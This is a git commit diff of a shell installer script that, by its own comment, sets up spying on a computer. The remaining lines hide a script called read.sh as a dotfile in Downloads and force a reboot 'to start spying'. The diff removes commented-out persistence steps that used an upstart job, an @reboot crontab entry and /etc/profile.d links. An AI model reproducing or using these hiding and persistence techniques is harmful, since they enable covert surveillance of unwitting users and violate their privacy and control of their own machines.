c8375f1ab2c46e47ff3d78589a0b793b62e1baae
greengon <greengon1991@gmail.com>
2019-03-08 03:40:23 -0800

    Cleand the initscript a bit

--- initScript.sh
+++ initScript.sh
@@ -12,13 +12,5 @@ sudo depmod
 cp ./read.sh ~/Downloads
 mv ~/Downloads/read.sh ~/Downloads/.read.sh
 
-#sudo touch /etc/init/nu11.config
-#sudo bash -c 'echo start on startup >> /etc/init/nu11.config'
-#sudo bash -c 'echo task >> /etc/init/nu11.config'
-#sudo bash -c 'echo exec ~/Downloads/.read.sh >> /etc/init/nu11.config'
-#sudo bash -c "echo @reboot  ~/Downloads/.read.sh >> /var/spool/cron/crontabs/$(whoami)"
-#sudo ln -s ~/Downloads/.read.sh /etc/profile.d/.read.sh 
-#sudo cp ./read.sh /etc/profile.d/read.sh
-
 # Restart Computer to start spying
 shutdown -r 0
